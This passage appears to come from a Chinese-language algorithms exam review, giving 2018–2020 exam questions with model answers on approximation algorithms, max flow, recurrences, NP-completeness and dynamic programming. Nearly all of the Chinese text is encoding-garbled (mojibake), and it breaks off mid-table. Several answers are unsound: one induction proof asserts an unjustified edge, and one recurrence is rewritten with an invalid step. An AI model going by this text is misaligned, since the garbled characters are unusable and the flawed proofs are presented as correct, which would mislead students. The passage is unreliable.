Balancingï¼‰é—®é¢˜è¦æ±‚å°†ä¸€äº›å·¥ä½œæ”¾åˆ°ä¸€äº›æœºæ¢°ä¸Šè¿›è¡Œå¤„ç†ï¼Œæ¯ä¸ªå·¥ä½œæœ‰ä¸€ä¸ªå›ºå®šçš„éœ€è¦å¤„ç†çš„æ—¶é—´ã€‚ç®—æ³•çš„æ€æƒ³å¦‚ä¸‹ï¼šå°†ä»»åŠ¡æŒ‰ä»»æ„ä¸€ä¸ªæ¬¡åºè¿›è¡Œæ’åºï¼Œå†ä¾æ¬¡å°†ä»»åŠ¡åˆ†é…åˆ°è´Ÿè½½æœ€è½»çš„æœºå™¨ä¸Šã€‚ç®€å•è¯æ˜è¯¥ç®—æ³•æ˜¯2å€è¿‘ä¼¼çš„ã€‚ï¼ˆ4åˆ†ï¼‰\n\n   ç­”ï¼šè®¾æœºå™¨ i æ˜¯ç“¶é¢ˆæœºå™¨(åˆ™ L[i] ä¸ºè´ªå¿ƒè§£)ï¼Œä»»åŠ¡ j æ˜¯æœ€åä¸€ä¸ªåœ¨æœºå™¨ i ä¸Šè°ƒåº¦çš„ä»»åŠ¡ï¼ˆåœ¨è°ƒåº¦å‰ï¼Œæœºå™¨ i çš„å·¥æœŸæ˜¯æœ€å°çš„ï¼‰æˆ‘ä»¬åœ¨è€ƒè™‘æ”¾å…¥æœ€åä¸€ä¸ªä»»åŠ¡å‰ï¼Œæ ¹æ®æˆ‘ä»¬æ”¾ç½®çš„è§„åˆ™ï¼Œè¯¥æœºå™¨ i æ˜¯æ‰€æœ‰æœºå™¨ä¸­è€—æ—¶æœ€çŸ­çš„(L[i] âˆ’ t<sub>j </sub>â‰¤ L[k])ï¼Œè¯¥æœºå™¨æ­¤æ—¶çš„ç”¨æ—¶(L[i] - t<sub>j</sub>)æ˜¯ä½äºé™¤æ‰æœ€åä¸€ä¸ªä»»åŠ¡ j åçš„å¹³å‡æ—¶é•¿(1/m)âˆ‘<sub>k</sub>L[k]ï¼Œæ›´ä½äºæ‰€æœ‰ä»»åŠ¡çš„å¹³å‡æ—¶é•¿(1/m)âˆ‘<sub>j</sub>t<sub>j</sub>(å¼•ç†2)ï¼›å†æ ¹æ®å¼•ç†1ï¼Œæœ€åä¸€ä¸ªä»»åŠ¡åº”è¯¥æ˜¯å°äºæœ€ä¼˜è§£çš„ã€‚\n\n   L[i] âˆ’ t<sub>jÂ </sub>â‰¤ L[k]ï¼Œå¯¹ä»»æ„ 1 â‰¤ k â‰¤ m\n\n   L[i] âˆ’ t<sub>j</sub> â‰¤ (1/m) âˆ‘<sub>k</sub>L[k] â‰¤ (1/m)âˆ‘<sub>j</sub>t<sub>j</sub> â‰¤ L<sup>âˆ—</sup> \n\n   L[i] = (L[i] âˆ’ t<sub>j</sub>) + t<sub>j</sub> \n   \n   L[i] âˆ’ t<sub>j</sub> â‰¤  L<sup>âˆ—</sup> ï¼Œt<sub>j</sub> â‰¤ L<sup>âˆ—</sup> \n   \n   âˆ´ L[i] â‰¤ 2L<sup>âˆ—</sup> \n\n------\n\n3. å™è¿°å¸¦æƒé‡çš„ç‚¹è¦†ç›–é—®é¢˜çš„ç«ä»·æ³•ï¼ˆPricing methodï¼‰çš„æ­¥éª¤ã€‚ï¼ˆ4åˆ†ï¼‰\n\n   ç­”ï¼šä»»é€‰ä¸€æ¡è¾¹ (i, j) åŠ ä¸Šä»£ä»·ï¼Œè¿™ä¸ªä»£ä»·ä»é›¶å¼€å§‹ï¼Œä¸”è¿™ä¸ªä»£ä»·çš„æœ€å¤§å€¼å°äº i å’Œ j èŠ‚ç‚¹çš„æƒå€¼ã€‚æ˜¾ç„¶ï¼Œè¿™ä¸ªè¾¹æƒå€¼çš„æœ€å¤§å€¼å–å†³äºä¸¤ä¸ªç«¯ç‚¹æƒå€¼çš„æœ€å°å€¼ï¼Œæˆ‘ä»¬è®¤ä¸ºå½“è¾¹æƒå€¼ä¸ç‚¹æƒå€¼ç›¸ç­‰æ—¶ï¼Œå¯¹åº”çš„é‚£ä¸ªç‚¹æ˜¯ç´§çš„ã€‚æŠŠæ‰€æœ‰ç´§çš„ç‚¹æ‰¾å‡ºæ¥å³ä¸ºé¡¶ç‚¹è¦†ç›–ã€‚\n\n------\n\n4. åœ¨ä¸€ä¸ªæ— å‘å›¾ä¸­ç»™å‡ºä¸¤ä¸ªé¡¶ç‚¹å¯¹ï¼ˆs1ï¼Œt1ï¼‰å’Œï¼ˆs2ï¼Œt2ï¼‰ï¼Œéœ€è¦æ±‚å‡ºåŒæ—¶ä» s1 æµå‘ t1 çš„æµåŠ ä¸Šä» s2 æµå‘ t2 çš„æµçš„å’Œè¾¾åˆ°æœ€å¤§ã€‚æœ‰ä¸€ä¸ªç®—æ³•æ˜¯ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„é¡¶ç‚¹ s ä»…è¿æ¥ s1 å’Œ s2 ï¼Œè¾¹çš„å®¹é‡æ— ç©·å¤§ï¼›å†æ·»åŠ ä¸€ä¸ªæ–°çš„é¡¶ç‚¹ t ä»…è¿æ¥ t1 å’Œ t2 ï¼Œè¾¹çš„å®¹é‡æ— ç©·å¤§ï¼›ç„¶åæ±‚ s åˆ° t çš„æœ€å¤§æµã€‚è¯·åˆ†æè¿™ä¸ªç®—æ³•çš„æ­£ç¡®æ€§ï¼ˆè®¤ä¸ºå®ƒæ˜¯é”™çš„å°±ç»™å‡ºç†ç”±ï¼Œè®¤ä¸ºå®ƒæ˜¯å¯¹çš„åˆ™ä¹Ÿç»™å‡ºè¯´æ˜å¹¶åˆ†æå…¶æ—¶é—´å¤æ‚æ€§ï¼‰ã€‚ï¼ˆ4åˆ†ï¼‰\n\n   ç­”ï¼šé”™è¯¯ã€‚ï¼ˆ2åˆ†ï¼‰\n\n   å› ä¸ºè¿™æ ·åšå°†ä¼šåŒ…å«ä» s1 åˆ° t2 çš„æµå’Œä» s2 åˆ° t1 çš„æµã€‚ï¼ˆ2åˆ†ï¼‰\n\n------\n\n#### 2019\n\n(2019)è®¡ç®—é¢˜å’Œç®€ç­”é¢˜ï¼Œè®¡ç®—é¢˜å¯ä»¥åªå†™ç­”æ¡ˆä¸å†™è¿‡ç¨‹(å…±24åˆ†ï¼Œå…±6é¢˜ï¼Œæ¯é¢˜4åˆ†)\n\n1. è¯æ˜ä¸€ä¸ªæœ‰å¥‡æ•°ä¸ªé¡¶ç‚¹çš„äºŒåˆ†å›¾ä¸€å®šä¸å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆã€‚(4åˆ†)\n\n   > è®¾G=(V,E)æ˜¯æ— å‘å›¾ï¼Œå¦‚æœ V å¯ä»¥åˆ’åˆ†ä¸ºå­é›† X å’Œ Yï¼Œä½¿å¾—å¯¹æ‰€æœ‰çš„e=(u,v)âˆˆE, éƒ½æœ‰ u å’Œ v åˆ†å±äº X å’Œ Yï¼Œåˆ™ç§° G æ˜¯äºŒåˆ†å›¾ï¼Œä¸‹å›¾ä¾¿æ˜¯ä¸€ä¸ªäºŒåˆ†å›¾ã€‚\n   >\n   > ![](https://img.jwt1399.top/img/202112072047766.png)\n\n   ï¼ˆæ•°å­¦å½’çº³æ³•ï¼‰\n\n   å½“n = 3ä¸ªé¡¶ç‚¹æ—¶å€™ï¼Œæ˜æ˜¾ä¸å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆ\n\n   å‡è®¾å½“ n = k ï¼Œkä¸ºå¥‡æ•°æ—¶ï¼Œä¸å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆ\n\n   å½“n = k + 2 æ—¶ï¼Œå‡è®¾å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆ\n\n   ç”±äºæ˜¯äºŒåˆ†å›¾ï¼Œåœˆä¸­ç›¸é‚»é¡¶ç‚¹å±äºä¸åŒå­é›†ï¼Œå‡è®¾ABCDæ˜¯åœˆä¸­å››ä¸ªç›¸é‚»çš„é¡¶ç‚¹ï¼Œåˆ™ACåœ¨äºŒåˆ†å›¾çš„ä¸€ä¸ªå­é›† X ä¸­ï¼ŒBD åœ¨å­é›† Y ä¸­ï¼Œé‚£ä¹ˆ AD æœ‰è¾¹ç›¸è¿ï¼Œå–æ‰BCä¸¤ç‚¹ï¼Œé“¾æ¥ADï¼Œä»ç„¶å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆï¼Œè€Œå‰©ä¸‹ç‚¹ä»ç„¶æ˜¯äºŒåˆ†å›¾ï¼Œä¸å‡è®¾çŸ›ç›¾ï¼Œå› æ­¤ä¸€ä¸ªæœ‰å¥‡æ•°ä¸ªé¡¶ç‚¹çš„äºŒåˆ†å›¾ä¸€å®šä¸å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆ\n\n\n------\n\n2. åœ¨ä¸€ä¸ªå›¾ä¸­ç»™å‡º x å¯¹é¡¶ç‚¹ (s<sub>1</sub>,t<sub>1</sub>)ï¼Œ(s<sub>2</sub>,t<sub>2</sub>)ï¼Œ...ï¼Œ(s<sub>x</sub>,t<sub>x</sub>) æ±‚ (s<sub>i</sub>,t<sub>i</sub>) è¿™ x å¯¹é¡¶ç‚¹ä¹‹é—´åŒæ—¶èƒ½è¾¾åˆ°çš„æœ€å¤§æµ(s<sub>iÂ </sub>åªèƒ½æµå‘ t<sub>i</sub>)ã€‚åˆ†æå¦‚ä¸‹ç®—æ³•çš„æ­£ç¡®æ€§ï¼šæ·»åŠ ä¸€ä¸ªé¡¶ç‚¹ s è¿æ¥æ‰€æœ‰ s<sub>i </sub>ï¼Œä¸” s åˆ° s<sub>i</sub> çš„å®¹é‡æ— ç©·å¤§ï¼›æ·»åŠ å¦ä¸€ä¸ªé¡¶ç‚¹ t è¿æ¥æ‰€æœ‰ t<sub>i</sub>ï¼Œä¸” t åˆ° t<sub>i</sub> çš„å®¹é‡æ— ç©·å¤§ï¼›åˆ™åªéœ€æ±‚ s åˆ° t ä¹‹é—´çš„æœ€å¤§æµã€‚(4åˆ†)\n\n   ç­”ï¼šæ­£ç¡®\n\n------\n\n3. å¦‚ä¸‹å¯æ»¡è¶³é—®é¢˜(SAT)å­˜åœ¨å‡ ç»„ä½¿å¾—å…¶å€¼ä¸ºçœŸçš„èµ‹å€¼ï¼Ÿç»™å‡ºå…·ä½“çš„èµ‹å€¼æ–¹æ¡ˆã€‚(4åˆ†)\n\n   ![](https://img.jwt1399.top/img/image-20211202215006674.png)\n\n   ç­”ï¼šx1=1ï¼Œx2=1ï¼Œx3=0ï¼Œx4=0\n\n------\n\n4. æ±‚å¦‚ä¸‹æœ‰å‘å›¾ä¸­ä¸€æ¡ä» A åˆ° D çš„æœ€é•¿è·¯å¾„ã€‚è¦æ±‚ç»™å‡ºè·¯ç»å’Œè·¯ç»é•¿åº¦çš„å€¼ã€‚(4åˆ†)\n\n![](https://img.jwt1399.top/img/image-20211202214527833.png)\n\nâ€‹\t\t\t\tå‚è€ƒç­”æ¡ˆï¼š CADBï¼Œé•¿åº¦ï¼š45+40+35=120\t\t\n\n------\n\n5. ç»™å‡ºå¦‚ä¸‹ä¸€ä¸ªå¸¦æƒé‡çš„å›¾ï¼Œå›¾ä¸­æ¯ä¸ªé¡¶ç‚¹ä¸Šçš„æ•°å­—ä¸ºè¯¥é¡¹ç‚¹çš„æƒé‡ï¼Œæ‰¾å‡ºå›¾ä¸­ä¸€ä¸ªç‹¬ç«‹é›†(ä¸€ç»„é¡¶ç‚¹ä¹‹é—´æ²¡æœ‰ä»»ä½•è¾¹ç§°ä¸ºä¸€ä¸ªç‹¬ç«‹é›†)ä½¿å¾—è¯¥ç‹¬ç«‹é›†ä¸­é¡¶ç‚¹çš„æƒé‡ä¹‹å’Œè¾¾åˆ°æœ€å¤§ã€‚(4åˆ†)\n\n   ![](https://img.jwt1399.top/img/image-20211202212817151.png)\n\n   ç­”ï¼š3 + 2 + 2 + 7 = 14\n\n   ![](https://img.jwt1399.top/img/image-20211206221643616.png)\n\n------\n\n6. æ±‚è§£ä¸‹é¢ä¸¤ä¸ªé€’å½’å…³ç³»å¼(4åˆ†)\n\n   (1)f(n) = 9f(n/3) + O(n<sup>2</sup>)\n\n   ç­”ï¼šåˆ©ç”¨ä¸»å®šç†æ±‚è§£\n\n   a = 9ï¼Œb = 3ï¼Œf(n) = n<sup>2</sup>ï¼Œn<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>3</sub>9</sup> = n<sup>2</sup> = f(n)\n\n   æ‰€ä»¥T(n) = Î˜(n<sup>log<sub>b</sub>a</sup>logn) = Î˜(n<sup>2</sup>logn)\n\n   (2)f(n) = 3f(n-3) + O(1)\n\n   ç­”ï¼šåˆ©ç”¨ç›´æ¥å±•å¼€æ³•æ±‚è§£\n\n   è¯¦ç»†è§£é¢˜æ­¥éª¤è¯·å‚è€ƒå‰é¢[åˆ†æ²»ç®—æ³•-çœŸé¢˜ç»ƒä¹ -é¢˜ç›®ä¸€-ç¬¬2é—®](#toc-heading-35)ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚\n\n------\n\n#### 2020\n\n(2020)ç®€ç­”å’Œè®¡ç®—é¢˜ï¼Œæ— éœ€è®¡ç®—è¿‡ç¨‹ï¼Œç›´æ¥ç»™å‡ºç­”æ¡ˆå³å¯(5åˆ†é¢˜ x 6é¢˜ = 30åˆ†)\n\n1. å¦‚æœ  P â‰  NP æ—¶ï¼Œè¯·ç»™å‡º Pï¼ŒNPï¼ŒNPC è¿™3ä¸ªé›†åˆä¸¤ä¸¤ä¹‹é—´çš„å…³ç³»ã€‚\n\n   ç­”ï¼šå¦‚æœ  P â‰  NP æ—¶ï¼ŒP âŠ† NPï¼ŒNPC âŠ† NPï¼ŒP â‰  NPC\n\n------\n\n2. è¯·ç”¨ä¸‹å›¾å³ä¾§æ‰€ç¤ºçš„4ç§ä¸åŒå½¢çŠ¶çš„Lå‹éª¨ç‰Œï¼Œè¦†ç›–ä¸‹å›¾å·¦ä¾§ç»™å®šæ£‹ç›˜ä¸Šé™¤é˜´å½±æ–¹æ ¼ä»¥å¤–çš„æ‰€æœ‰æ–¹æ ¼ï¼Œä¸”ä»»ä½•2ä¸ªLå‹éª¨ç‰Œä¸å¾—é‡å è¦†ç›–ï¼Œ4ç§Lå‹éª¨ç‰Œæ•°é‡å‡ä¸è®¾é™åˆ¶ã€‚\n\n   ![](https://img.jwt1399.top/img/image-20211202205116026.png)\n\nâ€‹\t\t\tç­”ï¼š\n\n![](https://img.jwt1399.top/img/D3BE67A2-F262-4E2E-8DC0-81053DBB99CB.jpg)\n\n------\n\n3. ç»™å®šæ•´æ•°åºåˆ—{a<sub>1</sub>,a<sub>2</sub>,a<sub>3</sub>,...,a<sub>n</sub>}ï¼Œå¦‚æœ i < j ä½†æ˜¯ a<sub>iÂ </sub>> a<sub>j</sub>é€†åºã€‚åˆ™(a<sub>i</sub>, a<sub>j</sub>)ç§°ä¸ºä¸€å¯¹é€†åºï¼Œè¯·è®¡ç®—æ•´æ•°åºåˆ—{32,15,48,17,21,24,57,12,36}ä¸­æœ‰å¤šå°‘å¯¹é€†åºã€‚\n\n   ç­”ï¼š5+1+5+1+1+1+2+0+0=16\n\n------\n\n4. ç»™å‡ºä¸‹åˆ—2ä¸ªé€’å½’å…³ç³»å¼çš„æ¸è¿‘ç•Œã€‚\n   (1)T(n) = 4T(n/2) + n<sup>1.9</sup>(logn)<sup>5</sup>\n\n   ç­”ï¼ša = 4ï¼Œb = 2 ï¼Œf(n) = n<sup>1.9</sup>(logn)<sup>5</sup>ï¼Œn<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>2</sub>4</sup> = n<sup>2</sup> > f(n)\n\n   å› æ­¤ T(n) = Î˜(n<sup>log<sub>b</sub>a</sup>) = Î˜(n<sup>2</sup>)\n\n   (2)T(n) = T(2n/3) + 1\n\n   ç­”ï¼ša =1ï¼Œb = 3/2 ï¼Œf(n) = 1ï¼Œn<sup>log<sub>b</sub>a</sup> = n<sup>0</sup> = 1 = f(n)\n\n   æ‰€ä»¥T(n) = Î˜(n<sup>log<sub>b</sub>a</sup>logn) = Î˜(logn)\n\n------\n\n5. ç»™å®šæ•´æ•°åºåˆ—(23ï¼Œ4ï¼Œ-2ï¼Œ30ï¼Œ- 63ï¼Œ47ï¼Œ26ï¼Œ-53ï¼Œ58ï¼Œ97ï¼Œ-93ï¼Œ-23ï¼Œ84ï¼Œ-15ï¼Œ6),æ±‚è¿™ä¸ªåºåˆ—çš„æœ€å¤§è¿ç»­å­åºåˆ—ä¹‹å’Œï¼Œå¹¶ç»™å‡ºç›¸åº”çš„å­åºåˆ—ã€‚ä¾‹å¦‚åºåˆ—(-20ï¼Œ11ï¼Œ-4ï¼Œ13ï¼Œ-5ï¼Œ-2)çš„æœ€å¤§è¿ç»­å­åºåˆ—ä¹‹å’Œä¸º 20 = sum(11, 4,13)ã€‚\n\n   ç­”ï¼š175 = sum(47,26,-53,58,97)\n\n------\n\n6. å°†ä¸‹åˆ—6ä¸ªå‡½æ•°æŒ‰æ¸è¿‘å¢é•¿ç‡ç”±ä½è‡³é«˜è¿›è¡Œæ’åºã€‚\n   f<sub>1</sub>(n) = log<sup>100</sup>n + logn<sup>100</sup>ï¼Œf<sub>2</sub>(n) = 2019n<sup>3</sup> +3<sup>n</sup>ï¼Œf<sub>3</sub>(n) = 2<sup>nlogn</sup> +log<sup>n</sup>n\n\n   f<sub>4</sub>(n) = 2019âˆšn<sup>2019</sup> ï¼Œf<sub>5</sub>(n) = n! + 100n<sup>n</sup> + n<sup>100</sup>ï¼Œf<sub>6</sub>(n) = log(3<sup>n</sup>logn)\n\n   ç­”ï¼š\n\n   f<sub>1</sub>(n) = log<sup>100</sup>n + 100logn = Î˜(log<sup>100</sup>n)ï¼Œf<sub>2</sub>(n) = 2019n<sup>3</sup> +3<sup>n</sup>= Î˜(3<sup>n</sup>)\n\n   f<sub>3</sub>(n) = n<sup>n</sup> +log<sup>n</sup>n = Î˜(n<sup>n</sup>)ï¼Œf<sub>4</sub>(n) = Î˜(n<sup>1009.5</sup>)\n\n   f<sub>5</sub>(n) =  Î˜(n<sup>n</sup>)ï¼Œf<sub>6</sub>(n) =nlog3 + loglogn = Î˜(n)\n\n   æ˜¾ç„¶ f<sub>6</sub>(n) ï¼œf<sub>4</sub>(n) ï¼œ f<sub>2</sub>(n) ï¼œ f<sub>3</sub>(n) = f<sub>5</sub>(n) \n   \n   f<sub>1</sub>(n) ï¼Œf<sub>6</sub>(n)åŒæ—¶å–å¯¹æ•° ï¼Œå› æ­¤ f<sub>1</sub>(n)ï¼œ f<sub>6</sub>(n)\n   \n   ç»¼ä¸Šæ‰€è¿°ï¼šf<sub>1</sub>(n)ï¼œ f<sub>6</sub>(n)ï¼œ f<sub>4</sub>(n) ï¼œ f<sub>2</sub>(n) ï¼œ f<sub>3</sub>(n) = f<sub>5</sub>(n) \n\n------\n\n### â¸è§£ç­”é¢˜\n\n> è¾…ä»¥æ¯ä¸ªç« èŠ‚çš„çœŸé¢˜ç»ƒä¹ éƒ¨åˆ†é£Ÿç”¨ï¼Œæ•ˆæœæ›´ä½³ï¼Œåˆç‹‚è‚äº†ä¸€æ³¢ï¼Œç¡è§‰ç¡è§‰ï¼Œç‹—å‘½è¦ç´§ã€‚ã€‚ã€‚\n\n#### 2018\n\nä¸‰ã€å°†ä¸‹åˆ—6ä¸ªå‡½æ•°æŒ‰æ¸è¿‘å¢é•¿ç‡ç”±ä½è‡³é«˜è¿›è¡Œæ’åºï¼Œè¦æ±‚å†™å‡ºåˆ¤æ–­ä¾æ®ï¼ˆ8åˆ†ï¼‰\n\n![](https://img.jwt1399.top/img/202112071844753.png)\n\nf<sub>1</sub>(n) = âˆšn + log<sup>100</sup>n = O(âˆšn)\n\nf<sub>2</sub>(n) = 2<sup>logn</sup> * 2<sup>loglogn</sup> = nlogn\n\nf<sub>3</sub>(n) = 100logn + nlog3 = O(n)\n\nf<sub>4</sub>(n) = O(3<sup>n</sup>)ã€f<sub>5</sub>(n) = 100log<sup>2</sup>nã€f<sub>6</sub>(n) =  O(n!)\n\n(1)æ˜¾ç„¶ f<sub>3</sub>(n) ï¼œ f<sub>2</sub>(n) ï¼œ f<sub>4</sub>(n)ï¼œf<sub>6</sub>(n) \n\n(2)f<sub>5</sub>(n) æ˜¯å¯¹æ•°çš„å¹‚ï¼Œf<sub>1</sub>(n) æ˜¯å¹‚å‡½æ•°ï¼Œå› æ­¤ f<sub>5</sub>(n)ï¼œ f<sub>1</sub>(n)\n\nç»¼ä¸Šæ‰€è¿°ï¼š f<sub>5</sub>(n) ï¼œ f<sub>1</sub>(n)ï¼œ f<sub>3</sub>(n) ï¼œ f<sub>2</sub>(n) ï¼œ f<sub>4</sub>(n)ï¼œf<sub>6</sub>(n) \n\n------\n\nå››ã€æ±‚å¦‚ä¸‹æœ‰å‘å›¾ä¸­så’Œté—´çš„æœ€å°å‰²ï¼Œå…¶ä¸­è¾¹ä¸Šçš„æ•°å­—è¡¨ç¤ºè¾¹çš„å®¹é‡ã€‚è¦æ±‚ç»™å‡ºæœ€å°‘ä¸¤ä¸ªä¸­é—´è®¡ç®—æ­¥éª¤ï¼ˆ8åˆ†ï¼‰ã€‚\n\n![](https://img.jwt1399.top//img/20211016201310.png)\n\nå°†æœ€å°å‰²é—®é¢˜è½¬åŒ–ä¸ºæœ€å¤§æµé—®é¢˜\n\n1å¢å¹¿è·¯å¾„ï¼š(*s*, *u*, *t*)ï¼Œæµé‡å€¼+5\n\n2å¢å¹¿è·¯å¾„ï¼š(*s*, *x*, *t*)ï¼Œæµé‡å€¼+5\n\n3å¢å¹¿è·¯å¾„ï¼š(*s*, *v*, *w*, *t*)ï¼Œæµé‡å€¼+8\n\n4å¢å¹¿è·¯å¾„ï¼š(*s*, *u*, *w*, *v*, *x*, *t*)ï¼Œæµé‡å€¼+3\n\n![](https://img.jwt1399.top//img/20211016201317.png)\n\næœ€å°å‰²ä¸º**[ {*s*, *u*}ï¼Œ{*w*, *v*, *x*, *t*} ]** å®¹é‡ä¸º **21**\n\n------\n\näº”ã€å¯¹æŸä¸ªè¾“å…¥å¤§å°ä¸ºnçš„é—®é¢˜æœ‰å¦‚ä¸‹ä¸‰ä¸ªåˆ†è€Œæ²»ä¹‹ç®—æ³•ï¼š\n\nï¼ˆ1ï¼‰ç®—æ³•1å°†è¯¥é—®é¢˜åˆ†æˆ5ä¸ªå­é—®é¢˜ï¼Œå­é—®é¢˜å¤§å°ä¸ºn/5ï¼Œå°†å­é—®é¢˜çš„è§£åˆå¹¶å¾—åˆ°ä¸Šä¸€çº§é—®é¢˜çš„è§£éœ€è¦O(n<sup>2</sup>)æ—¶é—´ï¼›\nï¼ˆ2ï¼‰ç®—æ³•2å°†è¯¥é—®é¢˜åˆ†æˆ4ä¸ªå­é—®é¢˜ï¼Œå­é—®é¢˜å¤§å°ä¸ºn/2ï¼Œå°†å­é—®é¢˜çš„è§£åˆå¹¶å¾—åˆ°ä¸Šä¸€çº§é—®é¢˜çš„è§£éœ€è¦O(n)æ—¶é—´ï¼›\nï¼ˆ3ï¼‰ç®—æ³•3å°†è¯¥é—®é¢˜åˆ†æˆ2ä¸ªå­é—®é¢˜ï¼Œç¬¬ä¸€ä¸ªå­é—®é¢˜å¤§å°ä¸ºn/3ï¼Œç¬¬äºŒä¸ªå­é—®é¢˜å¤§å°ä¸º2n/3ï¼Œå°†å­é—®é¢˜çš„è§£åˆå¹¶å¾—åˆ°ä¸Šä¸€çº§é—®é¢˜çš„è§£éœ€è¦O(n)æ—¶é—´ã€‚\nè¯·åˆ†æä»¥ä¸Š3ä¸ªç®—æ³•çš„è¿è¡Œæ—¶é—´ã€‚ï¼ˆ6åˆ†ï¼‰\n\nç­”ï¼š\n\n(1) T(n) = 5T(n/5) + n<sup>2</sup>\n\na = 5ï¼Œb = 5 ï¼Œf(n) =  n<sup>2</sup>ï¼Œn<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>5</sub>5</sup> = n < f(n)\n\nå†åˆ¤æ–­æ˜¯å¦æ»¡è¶³ä¸ç­‰å¼ï¼šaf(n/b) â‰¤ cf(n)ï¼Œä»£å…¥f(n) = n<sup>2</sup>\n\nn<sup>2</sup>/5å’Œcn<sup>2</sup>ï¼Œå½“ c â‰¥ 1/5 å³å¯æ»¡è¶³ af(n/b) â‰¤ cf(n) çš„å…³ç³»\n\nå› æ­¤ **T(n) = Î˜(f(n)) = Î˜(n<sup>2</sup>)**\n\n(2) T(n) = 4T(n/2) + n\n\na = 4ï¼Œb = 2 ï¼Œf(n) =  nï¼Œn<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>2</sub>4</sup> = n<sup>2</sup> > f(n)\n\nå­˜åœ¨ f(n) = O(n<sup>log<sub>b</sub>a-Îµ</sup>) = O(n<sup>log<sub>2</sub>4-2</sup>)ï¼ŒÎµ = 2\n\nå› æ­¤ **T(n) = Î˜(n<sup>log<sub>b</sub>a</sup>) = Î˜(n<sup>2</sup>)**\n\n(3) T(n) = T(n/3) + T(2n/3) + n\n\nT(n) = 3T(n/3)  + n\n\na = 3ï¼Œb = 3 ï¼Œf(n) =  nï¼Œn<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>3</sub>3</sup> = n = f(n)\n\nå› æ­¤ **T(n) = Î˜(n<sup>log<sub>b</sub>a</sup>logn) = Î˜(nlogn)**\n\n------\n\nå…­ã€å¯¹äºä¸‰ç€è‰²é—®é¢˜ï¼ˆå¯¹ä¸€ä¸ªå›¾çš„é¡¶ç‚¹è¿›è¡Œä¸‰ç§é¢œè‰²ç€è‰²ä½¿å¾—ç›¸é‚»ä¸¤ä¸ªç‚¹çš„é¢œè‰²ä¸ä¸€æ ·ï¼‰ï¼Œè‹¥å­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•åˆ¤æ–­ä¸€ä¸ªå›¾æ˜¯å¦å¯ä»¥ä¸‰ç€è‰²ï¼Œåˆ™å­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•å¯¹å¯ä»¥è¿›è¡Œä¸‰ç€è‰²çš„å›¾æ‰¾åˆ°ä¸€ä¸ªå¯è¡Œçš„ä¸‰ç€è‰²ã€‚ ï¼ˆ8åˆ†ï¼‰               \n\nç­”ï¼š\n\nè§£æ³•ä¸€ï¼šä¸æ–­åŠ è¾¹è¿›å»ç„¶åè¿›è¡Œåˆ¤æ–­ï¼Œç›´åˆ°ä¸èƒ½åŠ è¾¹ä¸ºæ­¢ã€‚è¿™æ ·ä¸‰ç§é¢œè‰²çš„ç‚¹å°±æ˜¯å›¾ä¸­ä¸‰ä¸ªç‹¬ç«‹é›†ã€‚ \n\nè§£æ³•äºŒï¼šä¸æ–­å°†ä¸¤ä¸ªä¸ç›¸é‚»çš„ç‚¹åˆå¹¶æˆä¸€ä¸ªç‚¹ç„¶åè¿›è¡Œåˆ¤æ–­ï¼Œç›´åˆ°ä¸èƒ½å†åˆå¹¶ä¸ºæ­¢ã€‚æœ€åå‰©ä¸‹ä¸‰ä¸ªç‚¹ã€‚\n\n------\n\n ä¸ƒã€ç»™å‡ºä¸€ä¸ªå›¾å’Œä¸€ä¸ªæ•´æ•°kï¼Œé—®æ˜¯å¦å¯ä»¥åœ¨è¿™ä¸ªå›¾ä¸Šåˆ é™¤kä¸ªç‚¹ä½¿å¾—å‰©ä½™å›¾ä¸Šæ²¡æœ‰ä¸‰è§’å½¢ï¼ˆå«æœ‰3ä¸ªé¡¶ç‚¹çš„åœˆï¼‰ã€‚è¯æ˜è¿™ä¸ªé—®é¢˜æ˜¯NPå®Œå…¨çš„ã€‚ ï¼ˆ10åˆ†ï¼‰\n\nç­”ï¼šä»ç‚¹è¦†ç›–é—®é¢˜è§„çº¦è¿‡æ¥ï¼ˆ2åˆ†ï¼‰ã€‚\n\nå¯¹äºä¸€ä¸ªç‚¹è¦†ç›–å®ä¾‹ Gï¼Œæ„é€ ä¸€ä¸ªè¯¥é—®é¢˜å®ä¾‹ G'ï¼›ï¼ˆ1åˆ†ï¼‰\nå¯¹ G ä¸­æ¯ä¸€æ¡è¾¹ abï¼Œéƒ½æ·»åŠ ä¸€ä¸ªæ–°çš„é¡¶ç‚¹ c ç„¶åè¿æˆä¸‰è§’å½¢ abcã€‚ï¼ˆ4åˆ†ï¼‰\nè¯´æ˜ G å­˜åœ¨å¤§å°ä¸º k çš„ç‚¹è¦†ç›–å½“ä¸”ä»…å½“ G' å­˜åœ¨ä¸€ä¸ªå¤§å°ä¸º k çš„è§£ã€‚ï¼ˆ3åˆ†ï¼‰\n\n------\n\n![](https://img.jwt1399.top/img/202112081252104.png)\n\nï¼ˆ1ï¼‰ä»¤è®¡ç®—**A<sub>1</sub> x A<sub>2</sub> x A<sub>3</sub> x ... x A<sub>n</sub>**æ‰€éœ€è¦çš„æœ€å°‘ä¹˜æ³•æ¬¡æ•°ä¸º*m*[*i*, *j*] \n\nâ€‹\t\t\tåˆ™é€’å½’å…³ç³»å¼ä¸º![](https://img.jwt1399.top//img/20211011201529.png)  \n\n ï¼ˆ2ï¼‰\n\n| m(*i*, *j*) | *j* = 1 | *j* = 2 | *j* = 3 | *j* = 4 | *j* = 5 |\n| ----------- | ------- | ------- | ------- | ------- | ------- |\n| *i* = 1     | 0       | 1440    | 3360    | 4000    | `5856`  |\n| *i* = 2     | /       | 0       | 2400    | 2800    | 4800    |\n| *i* = 3     | /       | /       | 0       | 1600    | 2880    |\n| *i* = 4     | /       | /       | /       | 0       | 3200    |\n| *i* = 5     | /       | /       | /       | /       | 0       |\n\n å°†å¯¹åº”`m(i,j)`çš„æ–­å¼€ä½ç½®`k`è®°ä¸º`s(i,j)`\n\n| *s*(*i*, *j*) | *j* = 1 